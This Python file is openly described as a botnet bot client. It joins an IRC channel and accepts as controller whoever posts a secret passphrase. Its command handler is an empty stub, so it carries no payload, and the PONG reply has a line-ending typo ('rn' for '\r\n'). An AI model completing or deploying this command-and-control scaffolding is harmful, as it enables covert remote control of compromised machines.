"""
a bot client for a botnet.
"""

import argparse
import sys
import string
import socket


class botClient:
    def __init__(self, host, port, channel, secret_phrase):
        self.host = host
        self.port = port
        self.channel = "#" + channel
        self.secret_phrase = secret_phrase
        self.bot_nick = "robotnik"
        self.irc_socket = None
        self.controller = None
        self.controller_nick = None

    def log(self, message):
        print(message)

    def send_msg(self, message):
        self.irc_socket.send(message.encode())
    def recv_msg(self):
        return self.irc_socket.recv(2040).decode()  #receive the text

    def send_to_channel(self, message):
        self.send_msg("PRIVMSG " + self.channel + " :" + message + "\n")

    def send_to_user(self, nick, message):
        self.send_msg("PRIVMSG " + nick + " :" + message + "\n")

    def start_client(self):
        self.irc_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.__connect()

        while True:
            text = self.get_text()
            self.log(text)

            # validate message (check if controller command)
            if not self.check_msg(text):
                continue

            # _, command = text.split(" :") # get the message itself
            # self.receive_command(command)

        self.irc_socket.close()

    def __connect(self):
        self.irc_socket.connect((self.host, self.port))  # connect to server
        self.send_msg("USER "+ "test" +" "+ self.bot_nick +" "+ self.bot_nick + \
        " :weew\n") # user authentication
        self.send_msg("NICK "+ self.bot_nick+"\n") # sets nick
        self.send_msg("JOIN "+ self.channel +"\n") # join the channel

    # Function to check for the secret passphrase
    def check_msg(self, text):
        if (not "PRIVMSG" in text) or (not self.channel in text):
            return False

        # get the sender's ID
        sender = text.split(':')[1].split(' ')[0]
        input_list = text.split(' :')
        # get the message sent by the sender
        message = input_list[1]

        # if no controller is defined
        if self.controller is None:
            # if the secret phrase is in the message, assign the controller
            if self.secret_phrase in message:
                self.controller = sender
                self.controller_nick, _ = sender.split('!')
                self.log("Controller Identified: " + self.controller)
            return True
        # if the message is from the current controller
        elif self.controller == sender:
            return True
        # if the message is not from the current controller
        else:
            return False

    def receive_command(self, command):
        pass


    # Code adapted from: https://pythonspot.com/en/building-an-irc-bot/
    def get_text(self):
        text = self.recv_msg() #receive the text
        if text.find('PING') != -1:
            self.send_msg('PONG ' + text.split()[1] + 'rn')
        return text

# argparse function to handle user input
# Reference: https://docs.python.org/3.6/howto/argparse.html
# define a string to hold the usage error msg
def parse_arguments():
    usage_string = ("bot.py <host> <port> <channel> <secret-phrase>")
    parser = argparse.ArgumentParser(usage=usage_string)

    parser.add_argument("host",
                        help="Specifies the address of the server",
                        type=str)
    parser.add_argument("port",
                        help="Specifies the port on which the server is listening. "
                        "Port in integer range 0-65535",
                        type=int)
    parser.add_argument("channel",
                        help="IRC channel to join",
                        type=str)
    parser.add_argument("secret_phrase",
                        help="A secret text required to connect",
                        type=str)
    args = parser.parse_args()

    # check that port is in a valid range
    if args.port < 0 or args.port > 65535:
        parser.exit("usage: " + usage_string)

    return args


def main():
    args = parse_arguments()
    # launch the client
    bot_client = botClient(args.host,
                    int(args.port), args.channel, args.secret_phrase)
    bot_client.start_client()

if __name__ == '__main__':
    main()
